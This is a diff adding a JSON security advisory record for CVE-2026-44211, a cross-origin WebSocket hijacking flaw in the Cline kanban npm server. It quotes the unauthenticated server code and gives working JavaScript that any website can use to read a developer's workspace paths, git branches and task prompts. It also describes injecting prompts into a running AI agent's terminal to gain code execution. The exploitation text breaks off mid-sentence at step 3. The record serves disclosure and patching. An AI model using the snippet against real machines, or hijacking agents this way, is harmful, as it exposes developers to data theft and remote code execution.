@@ -1,0 +1,58 @@
+{
+  "schema_version": "0.1.0",
+  "id": "AGT-2026-0057",
+  "modified": "2026-06-09T11:00:12.391324202Z",
+  "published": "2026-05-08T20:43:17Z",
+  "aliases": [
+    "GHSA-5c57-rqjx-35g2",
+    "CVE-2026-44211"
+  ],
+  "summary": "Cline Kanban Server has a Cross-Origin WebSocket Hijacking Vulnerability",
+  "details": "## Summary\n\nThe `kanban` npm package (used by the `cline` CLI) starts a WebSocket server on `127.0.0.1:3484` with no Origin header validation. Any website a developer visits can silently connect to the kanban server via WebSocket and:\n\n1. Leak sensitive data in real-time: workspace filesystem paths, task titles/descriptions, git branch info, AI agent chat messages\n2. Hijack running AI agent terminals by injecting arbitrary prompts into the agent's input, leading to remote code execution\n3. Kill running agent tasks by terminating active sessions via the control WebSocket\n\nWebSocket connections are not subject to CORS restrictions. The browser sends them freely to localhost regardless of the page's origin. The kanban server accepts all connections without checking the Origin header.\n\n## Affected Component\n\n- Package: `kanban` on npm (https://www.npmjs.com/package/kanban)\n- Repository: https://github.com/cline/kanban\n- Tested version: 0.1.59\n- Installed via: `cline` CLI (`cline --kanban` or default `cline` command)\n- Endpoints: `ws://127.0.0.1:3484/api/runtime/ws`, `ws://127.0.0.1:3484/api/terminal/io`, `ws://127.0.0.1:3484/api/terminal/control`\n\n## Root Cause\n\nThree WebSocket endpoints are exposed without authentication or Origin validation.\n\n### 1. Runtime state stream (no Origin check on upgrade)\n\n```javascript\nserver.on(\"upgrade\", (request, socket, head) => {\n    if (normalizeRequestPath(requestUrl.pathname) !== \"/api/runtime/ws\") {\n        return;\n    }\n    // No Origin header validation. Any website can connect.\n    deps.runtimeStateHub.handleUpgrade(request, socket, head, { requestedWorkspaceId });\n});\n```\n\nOn connection, the server immediately sends a full snapshot of the developer's workspace:\n\n```javascript\nsendRuntimeStateMessage(client, {\n    type: \"snapshot\",\n    currentProjectId: projectsPayload.currentProjectId,\n    projects: projectsPayload.projects,       // filesystem paths\n    workspaceState,                            // tasks, git info, board\n    workspaceMetadata,                         // git summary\n    clineSessionContextVersion\n});\n```\n\n### 2. Terminal I/O (raw bytes written to agent terminal, no auth)\n\n```javascript\nioServer.on(\"connection\", (ws, context2) => {\n    ws.on(\"message\", (rawMessage) => {\n        // Attacker's bytes written directly to the agent PTY\n        terminalManager.writeInput(taskId, rawDataToBuffer(rawMessage));\n    });\n});\n```\n\n### 3. Terminal control (can kill tasks, no auth)\n\n```javascript\ncontrolServer.on(\"connection\", (ws, context2) => {\n    ws.on(\"message\", (rawMessage) => {\n        const message = parseWebSocketPayload(rawMessage);\n        if (message.type === \"stop\") {\n            terminalManager.stopTaskSession(taskId);\n        }\n    });\n});\n```\n\n## Exploitation\n\n### Step 1: Cross-Origin Info Leak\n\nFrom any website, JavaScript connects to the runtime WebSocket. No CORS applies:\n\n```javascript\n// Run this on https://example.com. It connects to the victim's local kanban.\nconst ws = new WebSocket(\"ws://127.0.0.1:3484/api/runtime/ws\");\nws.onmessage = (e) => {\n    const m = JSON.parse(e.data);\n    // Immediately leaked:\n    console.log(m.workspaceState?.repoPath);         // \"/Users/victim/Projects/secret-project\"\n    console.log(m.workspaceState?.git?.currentBranch); // \"feature/unreleased-product\"\n    // Task titles and descriptions:\n    m.workspaceState?.board?.columns?.forEach(col =>\n        col.cards?.forEach(card =>\n            console.log(card.id, card.title, card.prompt)\n        )\n    );\n};\n```\n\nThe WebSocket also streams live updates as the developer works: task state changes, AI agent chat messages, git activity, all in real-time.\n\n### Step 2: Detect Running Agent Session\n\nThe runtime WebSocket broadcasts `task_sessions_updated` messages when an AI agent is active:\n\n```javascript\n// msg.type === \"task_sessions_updated\"\n// msg.summaries === [{ taskId: \"abc12\", state: \"running\", workspaceId: \"myproject\", pid: 12345 }]\n```\n\n### Step 3: Terminal Hijack into RCE\n\nWhen a run\n\nImported from OSV GHSA-5c57-rqjx-35g2.",
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://osv.dev/vulnerability/GHSA-5c57-rqjx-35g2"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/cline/cline/security/advisories/GHSA-5c57-rqjx-35g2"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44211"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/cline/cline"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "cline"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "2.13.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "database_specific": {
+    "artifact_type": "package",
+    "classification": "vulnerable",
+    "verification": "verified",
+    "reporter": "osv-import",
+    "severity": "critical"
+  }
+}
